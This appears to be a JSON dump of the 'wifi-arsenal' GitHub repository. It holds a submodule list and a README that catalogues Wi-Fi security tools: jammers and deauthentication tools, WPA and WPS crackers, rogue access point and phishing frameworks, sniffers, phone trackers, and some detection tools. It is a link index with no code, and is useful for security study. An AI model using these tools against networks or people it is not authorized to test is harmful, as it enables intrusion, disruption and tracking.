https://github.com/davidetestoni/pmkid-extractor\n[submodule \"wpa2-enterprise-attack\"]\n\tpath = wpa2-enterprise-attack\n\turl = https://github.com/ricardojoserf/wpa2-enterprise-attack\n[submodule \"WirelessMayhem\"]\n\tpath = WirelessMayhem\n\turl = https://github.com/c0mix/WirelessMayhem\n[submodule \"openwifi\"]\n\tpath = openwifi\n\turl = https://github.com/open-sdr/openwifi\n[submodule \"hostapd-mana\"]\n\tpath = hostapd-mana\n\turl = https://github.com/sensepost/hostapd-mana\n[submodule \"wifi-monitor\"]\n\tpath = wifi-monitor\n\turl = https://github.com/eye9poob/Wifi-monitor\n[submodule \"PyRIC\"]\n\tpath = PyRIC\n\turl = https://github.com/wraith-wireless/PyRIC\n[submodule \"geoprobe\"]\n\tpath = geoprobe\n\turl = https://github.com/Nirei/geoprobe\n[submodule \"wifiexplorer-sensor\"]\n\tpath = wifiexplorer-sensor\n\turl = https://github.com/adriangranados/wifiexplorer-sensor\n[submodule \"Probe-Hunter\"]\n\tpath = Probe-Hunter\n\turl = https://github.com/mgp25/Probe-Hunter\n[submodule \"Peanuts\"]\n\tpath = Peanuts\n\turl = https://github.com/NoobieDog/Peanuts\n[submodule \"krackattacks\"]\n\tpath = krackattacks\n\turl = https://github.com/vanhoefm/krackattacks\n[submodule \"WifiBF\"]\n\tpath = WifiBF\n\turl = https://github.com/Squuv/WifiBF\n[submodule \"wifipumpkin3\"]\n\tpath = wifipumpkin3\n\turl = https://github.com/P0cL4bs/wifipumpkin3\n[submodule \"wids-wips\"]\n\tpath = wids-wips\n\turl = https://github.com/pbalogh-sa/wids-wips\n[submodule \"RogueAP-Detector\"]\n\tpath = RogueAP-Detector\n\turl = https://github.com/anotherik/RogueAP-Detector\n[submodule \"Wall-of-Shame\"]\n\tpath = Wall-of-Shame\n\turl = https://github.com/teambi0s/Wall-of-Shame\n[submodule \"ManaToolkit\"]\n\tpath = ManaToolkit\n\turl = https://github.com/adde88/ManaToolkit\n[submodule \"etd\"]\n\tpath = etd\n\turl = https://github.com/stavinski/etd\n[submodule \"WiFiHunter\"]\n\tpath = WiFiHunter\n\turl = https://github.com/MA24th/WiFiHunter\n[submodule \"hcx-wifite\"]\n\tpath = hcx-wifite\n\turl = https://github.com/overmod1/hcx-wifite\n[submodule \"krackattacks-test-ap-ft\"]\n\tpath = krackattacks-test-ap-ft\n\turl = https://github.com/d30sa1/krackattacks-test-ap-ft\n[submodule \"Wireless_peeker\"]\n\tpath = Wireless_peeker\n\turl = https://github.com/FXShu/Wireless_peeker\n[submodule \"AircrackPy\"]\n\tpath = AircrackPy\n\turl = https://github.com/4nth0nySLT/AircrackPy\n[submodule \"wpasnff\"]\n\tpath = wpasnff\n\turl = https://github.com/dredge17/wpasnff\n[submodule \"invasit-network\"]\n\tpath = invasit-network\n\turl = https://github.com/valvesss/invasit-network\n[submodule \"wpakey\"]\n\tpath = wpakey\n\turl = https://github.com/rofl0r/wpakey\n[submodule \"wifibang\"]\n\tpath = wifibang\n\turl = https://github.com/Leviathan36/wifibang\n[submodule \"Noon\"]\n\tpath = Noon\n\turl = https://github.com/cristi092/Noon\n[submodule \"eewids\"]\n\tpath = eewids\n\turl = https://github.com/techge/eewids\n[submodule \"Auto-Besside-Capturer\"]\n\tpath = Auto-Besside-Capturer\n\turl = https://github.com/sethleedy/Auto-Besside-Capturer\n[submodule \"phalloc-sniffer\"]\n\tpath = phalloc-sniffer\n\turl = https://github.com/phalloc/phalloc-sniffer\n[submodule \"beaconleak\"]\n\tpath = beaconleak\n\turl = https://github.com/cjcase/beaconleak\n[submodule \"wifiBuddy\"]\n\tpath = wifiBuddy\n\turl = https://github.com/s0m3-1/wifiBuddy\n[submodule \"wpa2own\"]\n\tpath = wpa2own\n\turl = https://github.com/philcryer/wpa2own\n[submodule \"capbreaker\"]\n\tpath = capbreaker\n\turl = https://github.com/ghsi10/capbreaker\n[submodule \"KeyGrab\"]\n\tpath = KeyGrab\n\turl = https://github.com/ryansisco/KeyGrab\n[submodule \"probequest-framework\"]\n\tpath = probequest-framework\n\turl = https://github.com/SkypLabs/probequest\n[submodule \"Dot11Hunter\"]\n\tpath = Dot11Hunter\n\turl = https://github.com/SecHeart/Dot11Hunter\n[submodule \"anubis\"]\n\tpath = anubis\n\turl = https://github.com/sundaysec/anubis\n[submodule \"wifimitm\"]\n\tpath = wifimitm\n\turl = https://github.com/mvondracek/wifimitm\n[submodule \"wifi-mac-tracking\"]\n\tpath = wifi-mac-tracking\n\turl = https://github.com/rpp0/wifi-mac-tracking\n[submodule \"FakeAP-other\"]\n\tpath = FakeAP-other\n\turl = https://github.com/vtr0n/FakeAP\n[submodule \"jfap\"]\n\tpath = jfap\n\turl = https://github.com/jduck/jfap\n[submodule \"pyfi\"]\n\tpath = pyfi\n\turl = https://github.com/IsmaelRLG/pyfi\n[submodule \"dot11anonymizer\"]\n\tpath = dot11anonymizer\n\turl = https://github.com/adriangranados/dot11anonymizer\n[submodule \"wifi_landing_2\"]\n\tpath = wifi_landing_2\n\turl = https://github.com/argaon/wifi_landing_2\n[submodule \"deauth_dot11decrypt\"]\n\tpath = deauth_dot11decrypt\n\turl = https://github.com/WeareJoker/deauth_dot11decrypt\n[submodule \"scapy-dot11-toolkit\"]\n\tpath = scapy-dot11-toolkit\n\turl = https://github.com/zachMelody/scapy-dot11-toolkit\n[submodule \"Dot11Monitoring\"]\n\tpath = Dot11Monitoring\n\turl = https://github.com/Inkln/Dot11Monitoring\n[submodule \"widowmaker\"]\n\tpath = widowmaker\n\turl = https://github.com/violentshell/widowmaker\n[submodule \"pinecone\"]\n\tpath = pinecone\n\turl = https://github.com/pinecone-wifi/pinecone\n[submodule \"FakeAuth\"]\n\tpath = FakeAuth\n\turl = https://github.com/scriptedp0ison/FakeAuth\n[submodule \"refluxion\"]\n\tpath = refluxion\n\turl = https://github.com/chinarulezzz/refluxion\n[submodule \"WiFiSuite\"]\n\tpath = WiFiSuite\n\turl = https://github.com/NickSanzotta/WiFiSuite\n[submodule \"python-wifi-survey-heatmap\"]\n\tpath = python-wifi-survey-heatmap\n\turl = https://github.com/jantman/python-wifi-survey-heatmap\n[submodule \"wifi-configurator\"]\n\tpath = wifi-configurator\n\turl = https://github.com/ConnectBox/wifi-configurator\n[submodule \"hashcatch\"]\n\tpath = hashcatch\n\turl = https://github.com/staz0t/hashcatch\n[submodule \"nzyme\"]\n\tpath = nzyme\n\turl = https://github.com/lennartkoopmann/nzyme\n[submodule \"wifi-pentesting-guide\"]\n\tpath = wifi-pentesting-guide\n\turl = https://github.com/ricardojoserf/wifi-pentesting-guide\n[submodule \"raw-packet\"]\n\tpath = raw-packet\n\turl = https://github.com/raw-packet/raw-packet\n[submodule \"Curfew\"]\n\tpath = Curfew\n\turl = https://github.com/RavSS/Curfew\n[submodule \"wombat\"]\n\tpath = wombat\n\turl = https://github.com/Perdu/wombat\n[submodule \"panoptiphone\"]\n\tpath = panoptiphone\n\turl = https://github.com/Perdu/panoptiphone\n[submodule \"split\"]\n\tpath = split\n\turl = https://github.com/mcgregol/split\n[submodule \"PACE\"]\n\tpath = PACE\n\turl = https://github.com/redoverture/PACE\n[submodule \"WireCrack\"]\n\tpath = WireCrack\n\turl = https://github.com/proxyanon/WireCrack\n[submodule \"boa\"]\n\tpath = boa\n\turl = https://github.com/ajmwagar/boa\n[submodule \"ESSID-Uncover\"]\n\tpath = ESSID-Uncover\n\turl = https://github.com/harshadms/ESSID-Uncover\n[submodule \"wifight\"]\n\tpath = wifight\n\turl = https://github.com/teknoraver/wifight\n[submodule \"EagleEye\"]\n\tpath = EagleEye\n\turl = https://github.com/pmsosa/EagleEye\n[submodule \"airgeddon-plugins\"]\n\tpath = airgeddon-plugins\n\turl = https://github.com/KeyofBlueS/airgeddon-plugins\n[submodule \"wapi\"]\n\tpath = wapi\n\turl = https://github.com/vy/wapi\n[submodule \"wifite3\"]\n\tpath = wifite3\n\turl = https://github.com/R33V/wifite3\n[submodule \"realtek_rtwifi\"]\n\tpath = realtek_rtwifi\n\turl = https://github.com/kimocoder/realtek_rtwifi\n[submodule \"PRISM-AP\"]\n\tpath = PRISM-AP\n\turl = https://github.com/1N3/PRISM-AP\n[submodule \"websploit\"]\n\tpath = websploit\n\turl = https://github.com/websploit/websploit\n[submodule \"Wifi-Hacking\"]\n\tpath = Wifi-Hacking\n\turl = https://github.com/ankit0183/Wifi-Hacking\n[submodule \"wlanMonGenerator\"]\n\tpath = wlanMonGenerator\n\turl = https://github.com/bavxhack/wlanMonGenerator\n[submodule \"wifi-data-safari\"]\n\tpath = wifi-data-safari\n\turl = https://github.com/brangerbriz/wifi-data-safari\n[submodule \"wifite-patcher\"]\n\tpath = wifite-patcher\n\turl = https://github.com/jankubatt/wifite-patcher\n[submodule \"wifiteinstall\"]\n\tpath = wifiteinstall\n\turl = https://github.com/trudertube/wifiteinstall\n[submodule \"manafix\"]\n\tpath = manafix\n\turl = https://github.com/rkhunt3r/manafix\n[submodule \"wifite2-requirements\"]\n\tpath = wifite2-requirements\n\turl = https://github.com/KatzeMau/wifite2-requirements\n[submodule \"Mobile_Phone_Tracking\"]\n\tpath = Mobile_Phone_Tracking\n\turl = https://github.com/Bojak4616/Mobile_Phone_Tracking\n[submodule \"probe-stalker\"]\n\tpath = probe-stalker\n\turl = https://github.com/GlennPegden2/probe-stalker\n"
        },
        {
          "name": "3WiFi",
          "type": "commit",
          "content": null
        },
        {
          "name": "3vilTwinAttacker",
          "type": "commit",
          "content": null
        },
        {
          "name": "801.11Project",
          "type": "commit",
          "content": null
        },
        {
          "name": "802.11-data",
          "type": "commit",
          "content": null
        },
        {
          "name": "802.11i-Analysis",
          "type": "commit",
          "content": null
        },
        {
          "name": "802.11p-iw",
          "type": "commit",
          "content": null
        },
        {
          "name": "802.11p-wireless-regdb",
          "type": "commit",
          "content": null
        },
        {
          "name": "802.11r",
          "type": "commit",
          "content": null
        },
        {
          "name": "80211-fun",
          "type": "commit",
          "content": null
        },
        {
          "name": "80211_raw",
          "type": "commit",
          "content": null
        },
        {
          "name": "80211client",
          "type": "tree",
          "content": null
        },
        {
          "name": "80211mgmtDoS",
          "type": "commit",
          "content": null
        },
        {
          "name": "80211p_raw",
          "type": "commit",
          "content": null
        },
        {
          "name": "80211ping",
          "type": "commit",
          "content": null
        },
        {
          "name": "80211scrambler",
          "type": "commit",
          "content": null
        },
        {
          "name": "ADSLPT-WPA",
          "type": "commit",
          "content": null
        },
        {
          "name": "AIRBASE-NG-SSLSTRIP-AIRSTRIP",
          "type": "commit",
          "content": null
        },
        {
          "name": "Aerial",
          "type": "commit",
          "content": null
        },
        {
          "name": "AirLibre",
          "type": "commit",
          "content": null
        },
        {
          "name": "AirPirate",
          "type": "commit",
          "content": null
        },
        {
          "name": "AircrackPy",
          "type": "commit",
          "content": null
        },
        {
          "name": "Airvengers",
          "type": "commit",
          "content": null
        },
        {
          "name": "Armory",
          "type": "commit",
          "content": null
        },
        {
          "name": "AtEar",
          "type": "commit",
          "content": null
        },
        {
          "name": "AtherosROMKit",
          "type": "commit",
          "content": null
        },
        {
          "name": "Auto-Airodump-NG",
          "type": "commit",
          "content": null
        },
        {
          "name": "Auto-Besside-Capturer",
          "type": "commit",
          "content": null
        },
        {
          "name": "Auto-mdk3_v02",
          "type": "commit",
          "content": null
        },
        {
          "name": "AutoPixieWps",
          "type": "commit",
          "content": null
        },
        {
          "name": "BRUTEIT",
          "type": "commit",
          "content": null
        },
        {
          "name": "BitcoinWifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "BoopSuite",
          "type": "commit",
          "content": null
        },
        {
          "name": "BrcmPatchRAM",
          "type": "commit",
          "content": null
        },
        {
          "name": "Burgess",
          "type": "commit",
          "content": null
        },
        {
          "name": "CODEX",
          "type": "commit",
          "content": null
        },
        {
          "name": "COUCHFI",
          "type": "commit",
          "content": null
        },
        {
          "name": "Chura-Liya",
          "type": "commit",
          "content": null
        },
        {
          "name": "CloudCrackInstaller",
          "type": "commit",
          "content": null
        },
        {
          "name": "CloudMAC-Misc",
          "type": "commit",
          "content": null
        },
        {
          "name": "Crippled",
          "type": "commit",
          "content": null
        },
        {
          "name": "Curfew",
          "type": "commit",
          "content": null
        },
        {
          "name": "DeSniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "DebAPoint",
          "type": "commit",
          "content": null
        },
        {
          "name": "Domain-WIFILocate",
          "type": "commit",
          "content": null
        },
        {
          "name": "Dot11Attacker",
          "type": "commit",
          "content": null
        },
        {
          "name": "Dot11Hunter",
          "type": "commit",
          "content": null
        },
        {
          "name": "Dot11Monitoring",
          "type": "commit",
          "content": null
        },
        {
          "name": "ESSID-Uncover",
          "type": "commit",
          "content": null
        },
        {
          "name": "EagleEye",
          "type": "commit",
          "content": null
        },
        {
          "name": "Eircog",
          "type": "commit",
          "content": null
        },
        {
          "name": "EvilAP_Defender",
          "type": "commit",
          "content": null
        },
        {
          "name": "FFT_eval",
          "type": "commit",
          "content": null
        },
        {
          "name": "FWAP",
          "type": "commit",
          "content": null
        },
        {
          "name": "FakeAP-other",
          "type": "commit",
          "content": null
        },
        {
          "name": "FakeAuth",
          "type": "commit",
          "content": null
        },
        {
          "name": "FreeWifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "FruityWifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "FuzzAP",
          "type": "commit",
          "content": null
        },
        {
          "name": "GrapplingHook",
          "type": "commit",
          "content": null
        },
        {
          "name": "HT-WPS-Breaker",
          "type": "commit",
          "content": null
        },
        {
          "name": "HandShaker",
          "type": "commit",
          "content": null
        },
        {
          "name": "Hijacker",
          "type": "commit",
          "content": null
        },
        {
          "name": "Hostapd-with-WebID",
          "type": "commit",
          "content": null
        },
        {
          "name": "IKECrack",
          "type": "tree",
          "content": null
        },
        {
          "name": "IndoorPositionr",
          "type": "commit",
          "content": null
        },
        {
          "name": "JamWiFi",
          "type": "commit",
          "content": null
        },
        {
          "name": "KRACK",
          "type": "commit",
          "content": null
        },
        {
          "name": "KRACK-toolkit",
          "type": "commit",
          "content": null
        },
        {
          "name": "KRACKDetection",
          "type": "commit",
          "content": null
        },
        {
          "name": "KeyGrab",
          "type": "commit",
          "content": null
        },
        {
          "name": "KisMac2",
          "type": "commit",
          "content": null
        },
        {
          "name": "Krack-wps",
          "type": "commit",
          "content": null
        },
        {
          "name": "KrackAttack",
          "type": "commit",
          "content": null
        },
        {
          "name": "KrackPlus",
          "type": "commit",
          "content": null
        },
        {
          "name": "LANs.py",
          "type": "commit",
          "content": null
        },
        {
          "name": "ManaToolkit",
          "type": "commit",
          "content": null
        },
        {
          "name": "MappingWirelessNetworks",
          "type": "commit",
          "content": null
        },
        {
          "name": "Mobile_Phone_Tracking",
          "type": "commit",
          "content": null
        },
        {
          "name": "MulitFi",
          "type": "commit",
          "content": null
        },
        {
          "name": "Native-WiFi-API-Beacon-Sniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "NiFiCapture",
          "type": "commit",
          "content": null
        },
        {
          "name": "Noon",
          "type": "commit",
          "content": null
        },
        {
          "name": "OS-X-Realtek-Network",
          "type": "commit",
          "content": null
        },
        {
          "name": "OneShot",
          "type": "commit",
          "content": null
        },
        {
          "name": "P4wnP1_WiFi_covert_channel_client",
          "type": "commit",
          "content": null
        },
        {
          "name": "PACE",
          "type": "commit",
          "content": null
        },
        {
          "name": "PCAP-CRACKER",
          "type": "commit",
          "content": null
        },
        {
          "name": "PCS",
          "type": "commit",
          "content": null
        },
        {
          "name": "PINEAPPLE",
          "type": "commit",
          "content": null
        },
        {
          "name": "PRISM-AP",
          "type": "commit",
          "content": null
        },
        {
          "name": "PSKracker",
          "type": "commit",
          "content": null
        },
        {
          "name": "Peanuts",
          "type": "commit",
          "content": null
        },
        {
          "name": "PiDense",
          "type": "commit",
          "content": null
        },
        {
          "name": "PiFinger",
          "type": "commit",
          "content": null
        },
        {
          "name": "PiKarma",
          "type": "commit",
          "content": null
        },
        {
          "name": "PiSavar",
          "type": "commit",
          "content": null
        },
        {
          "name": "PiWAT2",
          "type": "commit",
          "content": null
        },
        {
          "name": "Probe-Hunter",
          "type": "commit",
          "content": null
        },
        {
          "name": "PwnSTAR",
          "type": "commit",
          "content": null
        },
        {
          "name": "Pwnstar9-0-for-Kali-2016R1-2",
          "type": "commit",
          "content": null
        },
        {
          "name": "Pwnstar9.0-for-WPA-Phishing",
          "type": "commit",
          "content": null
        },
        {
          "name": "PyRIC",
          "type": "commit",
          "content": null
        },
        {
          "name": "PyScapy",
          "type": "commit",
          "content": null
        },
        {
          "name": "PyWiWi",
          "type": "commit",
          "content": null
        },
        {
          "name": "Pyrit",
          "type": "commit",
          "content": null
        },
        {
          "name": "Python-Wi-Fi-Positioning-System",
          "type": "commit",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 56.0146484375,
          "content": "# WiFi Arsenal\n\nRepo fully maintained by [0x90/wifi-arsenal](https://github.com/0x90/wifi-arsenal)\n\nREADME.md created by [techge/wifi-arsenal](https://github.com/techge/wifi-arsenal)\n\n## Table of Contents\n\n* [General WiFi Information](#general-wifi-information)\n* [Noteworthy Tools of Different Categories](#noteworthy-tools-of-different-categories)\n* [Attack/PenTesting](#attackpentesting)\n  * [Denial of Service](#denial-of-service)\n  * [Encryption Attack](#encryption-attack)\n    * [WEP/WPA/WPA2](#wepwpawpa2)\n    * [WPS](#wps)\n    * [Others](#others)\n  * [Injection](#injection)\n  * [Rogue AP/Fake AP/ MITM](#rogue-apfake-ap-mitm)\n  * [Sniffing](#sniffing)\n  * [Wardriving](#wardriving)\n  * [Miscellaneous Attacking Tools](#miscellaneous-attacking-tools)\n* [Information Gathering](#information-gathering)\n* [Defence/Detection](#defencedetection)\n* [Libraries/General Purpose Tools](#librariesgeneral-purpose-tools)\n* [Visualization](#visualization)\n* [Localisation](#localisation)\n* [Configuration/setup](#configurationsetup)\n* [Monitoring](#monitoring)\n* [Miscellaneous/not sorted :)](#miscellaneousnot-sorted-)\n\nTOC created by [gh-md-toc](https://github.com/ekalinin/github-markdown-toc)\n## General WiFi Information\n* [802.11 frames](https://supportforums.cisco.com/t5/wireless-mobility-documents/802-11-frames-a-starter-guide-to-learn-wireless-sniffer-traces/ta-p/3110019/) - A starter guide to learn wireless sniffer traces\n* [80211 Pocket Reference Guide](http://www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf) - Cheat Sheet for 802.11\n* [802.11p-wireless-regdb ](https://github.com/CTU-IIG/802.11p-wireless-regdb/) - Wireless regulatory database for CRDA \n* [802.11 Wireless Networks: The Definitive Guide](http://my.safaribooksonline.com/book/networking/wireless/0596001835/802dot11-framing-in-detail/wireless802dot11-chp-4-sect-3/) - Partly open chapters of O‘Reilly 802.11 book\n* [Armory](https://github.com/justinbeatz/Armory/) - The 802.11 Hacking Repo (Meta Information, Link collection)\n* [Awesome-wifi-security](https://github.com/edelahozuah/awesome-wifi-security/) - A collection of awesome resources related to 802.11 security, tools and other things\n* [Call-for-wpa3](https://github.com/d33tah/call-for-wpa3/) - Call for WPA3 - what's wrong with WPA2 security and how to fix it\n* [Known manufacturer MAC list](https://code.wireshark.org/review/gitweb?p=wireshark.git&a=blob_plain&f=manuf) - \n* [Wikipedia](https://en.wikipedia.org/wiki/IEEE_802.11) - IEEE802.11 site of Wikipedia\n## Noteworthy Tools of Different Categories\n* [Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng/) - WiFi security auditing tools suite\n* [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon/) - This is a multi-use bash script for Linux systems to audit wireless networks\n* [karma](https://github.com/atimorin/karma/) - KARMA Attacks Radioed Machines Automatically (KARMA)\n* [kismet](https://github.com/kismetwireless/kismet/) - Wireless network detector, sniffer, and intrusion detection system\n* [mdk3_6.1](https://github.com/ytisf/mdk3_6.1/) - A fork and modification of the original MDK3 \n* [pyrit](https://github.com/JPaulMora/Pyrit/) - The famous WPA precomputed cracker, Migrated from Google\n* [Scapy](https://github.com/secdev/scapy) - Python-based interactive packet manipulation program & library\n* [waidps](https://github.com/SYWorks/waidps/) - Wireless Auditing, Intrusion Detection & Prevention System\n* [WiFi-Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin/) - Framework for Rogue Wi-Fi Access Point Attack\n* [Wireless-ids](https://github.com/SYWorks/wireless-ids/) - Ability to detect suspicious activity such as (WEP/WPA/WPS) attack by sniffing the air for wireless packets\n* [zarp](https://github.com/hatRiot/zarp/) - Network attack tool centered around the exploitation of local networks\n## Attack/PenTesting\n### Denial of Service\n* [80211mgmtDoS](https://github.com/phildom/80211mgmtDoS/) - 802.11 DoS Attacks based on unprotected Management frames\n* [airodump_mod](https://github.com/maroviher/airodump_mod/) - Improved version of airodump-ng with ability to kick-off a stations from AP\n* [android_packetspammer](https://github.com/bcopeland/android_packetspammer/) - Packetspammer sends unencrypted broadcast packets down a mac80211 wireless interface that should be set for Monitor mode\n* [apflood](https://github.com/d4rkcat/apflood/) - Flood area with fake essids\n* [dw](https://github.com/ndyakov/dw/) - Small tool for sending 802.11 disassociation and deauthentication packets to specific clients. \n* [hwk](https://github.com/0x90/wifi-arsenal/tree/master/hwk/) - Hwk is a collection of packet crafting/network flooding tools\n* [JamWiFi](https://github.com/unixpickle/JamWiFi/) - A GUI, easy to use WiFi network jammer for Mac OS X\n* [Mass-deauth-attack](https://github.com/shunghsiyu/mass-deauth-attack/) - A program that does Deauthentication Attack on every nearby wireless device\n* [Mass-deauth](https://github.com/Andy-Maclachlan/mass-deauth/) - A script for 802.11 mass-deauthentication\n* [mdk3_6.1](https://github.com/ytisf/mdk3_6.1/) - A fork and modification of the original MDK3 \n* [modwifi](https://github.com/vanhoefm/modwifi/) - Advanced Wi-Fi Attacks Using Commodity Hardware\n* [netattack](https://github.com/chrizator/netattack/) - Python script that allows you to scan your local area for WiFi Networks and perform deauthentification attacks\n* [Scapy-deauth](https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py/) - Scapy based wifi Deauth\n* [ska](https://github.com/0x90/wifi-arsenal/tree/master/ska/) - Framework for sniffing ieee80211 packets and generating deauth packets and sending raw packets.\n* [wificurse](https://github.com/0x90/wifi-arsenal/tree/master/wificurse/) - WiFi DoS attack tool created for educational purposes only. It works only in Linux and requires wireless card drivers capable of injecting packets in wireless networks\n* [WifiDeauth](https://github.com/Revimal/WifiDeauth/) - A lightweight Wi-Fi auto deauthentication attack tool (libtins/C++)\n* [wifijammer](https://github.com/DanMcInerney/wifijammer/) - Continuously jam all wifi clients/routers\n* [WiFi-Rifle](https://github.com/sensepost/WiFi-Rifle/) - Creating a wireless rifle de-authentication gun, which utilized a yagi antenna and a Raspberry Pi\n* [wirelessjammer](https://github.com/phr34k0/wirelessjammer/) - Continuously jam all wifi clients and access points within range\n* [zizzania](https://github.com/cyrus-and/zizzania/) - Automated DeAuth attack\n### Encryption Attack\n#### WEP/WPA/WPA2\n* [Eicrog](https://github.com/nosmo/Eircog/) - WEP key generator for predictable key weaknesses\n* [huawei_wifi](https://github.com/davux/huawei_wifi/) - Wifi utilities for finding Huawei routers' default key\n* [Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng/) - WiFi security auditing tools suite\n* [airmode](https://github.com/parrotsec/airmode/) - AirMode is a GUI that can help you to use the Aircrack framework\n* [airoscriptng](https://github.com/wi-fi-analyzer/airoscriptng/) - Airoscript-ng python complete implementation\n* [Airvengers](https://github.com/hiteshchoudhary/Airvengers/) - A GUI to pentest wifi Network, based on Aircrack-ng tools\n* [asleap](https://github.com/0x90/wifi-arsenal/tree/master/asleap/) - Recovers weak LEAP password.  Pronounced asleep.\n* [autokwaker](https://github.com/pasdesignal/autokwaker/) - Creating an auto cracker for 802.11 networks\n* [cenarius](https://github.com/adelashraf/cenarius/) - Cenarius tool for crack Wi-Fi , crack wpa-psk , crack wpa2-psk , crack wep , crack wps pin and crack hidden AP . cenarius psk crack\n* [cherry](https://github.com/axilirator/cherry/) - Distributed WPA/WPA2 cracker\n* [Cowpatty](http://www.willhackforsushi.com/?page_id=50/) - Offline dictionary attack against WPA/WPA2 networks using PSK-based authentication (e.g. WPA-Personal)\n* [dot11decrypt](https://github.com/mfontanini/dot11decrypt/) - An 802.11 WEP/WPA2 on-the-fly decrypter. \n* [Fern-wifi-cracker](https://github.com/savio-code/fern-wifi-cracker/) - Crack and recover WEP/WPA/WPS keys and also run other network based attacks on wireless or ethernet based networks\n* [HandShaker](https://github.com/d4rkcat/HandShaker/) - Detect, capture, crack WPA/2 handshakes, WEP Keys and geotag with Android GPS\n* [hcxtools](https://github.com/ZerBea/hcxtools/) - Solution for capturing wlan traffic and conversion to hashcat formats (recommended by hashcat) and to John the Ripper\n* [kismet-deauth-wpa2-handshake-plugin](https://github.com/ph4r05/kismet-deauth-wpa2-handshake-plugin/) - Python plugin for Kismet to perform deauthentication to collect WPA2 handshakes\n* [marfil](https://github.com/pupi1985/marfil/) - Assess WiFi network security. It allows to split the work of performing long running dictionary attacks among many computers\n* [peapwn](https://github.com/rpp0/peapwn/) - Proof-of-concept implementation of the Apple relay attack in Python \n* [pyrcrack](https://github.com/XayOn/pyrcrack/) - Python Aircrack-ng\n* [pyrit](https://github.com/JPaulMora/Pyrit/) - The famous WPA precomputed cracker, Migrated from Google\n* [pythonAir](https://github.com/Slickness/pythonAir/) - Flask/aircrack\n* [uploadwpa](https://github.com/Alf-Alfa/uploadwpa/) - This module will upload a wpa handshake from a single capture file to an online hash cracker site\n* [WiFi-autopwner](https://github.com/Mi-Al/WiFi-autopwner/) - Script to automate searching and auditing Wi-Fi networks with weak security\n* [Wifi-bruteforcer-fsecurify](https://github.com/faizann24/wifi-bruteforcer-fsecurify/) - Android application to brute force WiFi passwords without requiring a rooted device\n* [wificracking](https://github.com/brannondorsey/wifi-cracking/) - Crack WPA/WPA2 Wi-Fi Routers with Airodump-ng and Aircrack-ng/Hashcat\n* [Wifi-hacker](https://github.com/esc0rtd3w/wifi-hacker/) - Shell Script For Attacking Wireless Connections Using Built-In Kali Tools. Supports All Securities (WEP, WPS, WPA, WPA2) \n* [wifite2](https://github.com/derv82/wifite2/) - Python script for auditing wireless networks\n* [wifite](https://github.com/derv82/wifite/) - An automated wireless attack tool\n* [Wifite-mod-pixiewps](https://github.com/aanarchyy/wifite-mod-pixiewps/) - Wifite with PixieWPS support\n* [Wifite-openwrt](https://github.com/kbeflo/wifite-openwrt/) - Wifite for the WiFi Pineapple NANO + TETRA (Chaos Calmer - openWrt) \n* [wlandecrypter](https://github.com/wi-fi-analyzer/wlandecrypter/) - Dictionary attack (spanish)\n* [WPA2-HalfHandshake-Crack](https://github.com/dxa4481/WPA2-HalfHandshake-Crack/) - Capture enough of a handshake with a user from a fake AP to crack a WPA2 network without knowing the passphrase of the actual AP\n* [wpa2hc](https://github.com/historypeats/wpa2hc/) - Quick script to automate converting WPA .cap files for Hashcat .hccap files. \n* [Wpa-autopwn](https://github.com/vnik5287/wpa-autopwn/) - WPA/WPA2 autopwn script that parses captured handshakes and sends them to the Crackq\n* [Wpa-bruteforcer](https://github.com/SYWorks/wpa-bruteforcer/) - Attacking WPA/WPA encrypted access point without client. \n* [wpacrack](https://github.com/derv82/wpacrack/) - Open-source distributed Wifi-Protected Access (WPA) cracker\n* [WPA_DECRYPTION_MPI](https://github.com/shagrath89m/WPA_DECRYPTION_MPI/) - WPA/WPA2 for cluster processing\n* [WPAdiz](https://github.com/leminski/WPAdiz/) - Bruteforce - New method for generate dictionaries (Wireless)\n#### WPS\n* [autoreaver](https://github.com/0x90/auto-reaver/) - Automatically exported from code.google.com/p/auto-reaver\n* [bully](https://github.com/aanarchyy/bully/) - New implementation of the WPS brute force attack, written in C\n* [greaver](https://github.com/sigginet/greaver/) - GUI for Reaver, WPS brute force tool\n* [HT-WPS-Breaker](https://github.com/SilentGhostX/HT-WPS-Breaker/) - HT-WPS Breaker (High Touch WPS Breaker)\n* [Penetrators-wps](https://github.com/dadas190/penetrator-wps/) - Experimental tool that is capable of attacking multiple WPS-enabled wireless access points in real time.\n* [phpreaver](https://github.com/phpreaver/phpreaver/) - A command line PHP script which uses the reaver WPS pin cracker to test multiple AP's with multiple WiFi adapters.\n* [Pixiewps-android](https://github.com/ru-faraon/pixiewps-android/) - Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some APs (pixie dust attack).\n* [pixiewps](https://github.com/wiire-a/pixiewps/) - An offline WPS brute-force utility \n* [pyReaver](https://github.com/byt3bl33d3r/pyReaver/) - WPS attack tool written in Python\n* [pyxiewps_WPShack-Python](https://github.com/jgilhutton/pyxiewps_WPShack-Python/) - Wireless attack tool written in python that uses reaver, pixiewps and aircrack to retrieve the WPS pin of any vulnerable AP in seconds\n* [reaver_reattempt](https://github.com/kurobeats/reaver_reattempt/) - Change the Mac address of the wifi connection as well as the emulated one created by airmon-ng in an attempt to avoid being locked out of routers for repeated WPS attack attempts\n* [Reaver-ui](https://github.com/deoxxa/reaver-ui/) - Hacky UI to wrap around reaver-wps \n* [Reaver-webui](https://github.com/fopina/reaver-webui/) - Simple WebUI to crack wireless networks using reaver\n* [Reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x/) - Community forked version which includes various bug fixes, new features and additional attack method (such as the offline Pixie Dust attack)\n* [Reaver-wps](https://github.com/gabrielrcouto/reaver-wps/) - Brute force attack against Wifi Protected Setup \n* [wpscrack](https://github.com/ml31415/wpscrack/) - Continuation of wpscrack originally written by Stefan Viehböck\n* [wps](https://github.com/devttys0/wps/) - WPS related utilities \n* [WPSIG](https://www.coresecurity.com/corelabs-research/open-source-tools/wpsig) - Simple tool (written in Python) that does information gathering using WPS information 